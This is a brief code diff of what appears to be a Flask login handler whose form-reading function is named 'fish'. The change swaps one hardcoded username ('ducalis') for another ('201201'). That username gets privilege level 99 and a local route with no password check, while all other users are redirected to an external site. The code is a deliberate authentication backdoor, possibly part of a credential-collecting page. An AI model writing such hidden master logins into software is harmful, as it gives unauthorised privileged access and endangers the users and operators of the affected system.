@@ -20,7 +20,7 @@ crop_url = 'https://hata.mobi/index.php?r=crop'
 def index():
     redirect_url = ''
     isIncorrect, message, lvl, username, password = fish(request)
-    if username == 'ducalis':
+    if username == '201201':
         redirect_url = '/crop'
     else:
         redirect_url = crop_url
@@ -88,7 +88,7 @@ def fish(req):
         username = req.form.get('username')  # запрос к данным формы
         password = req.form.get('password')
 
-        if username == "ducalis":
+        if username == "201201":
             lvl = 99
         else:
             lvl = check_authorize(username, password)
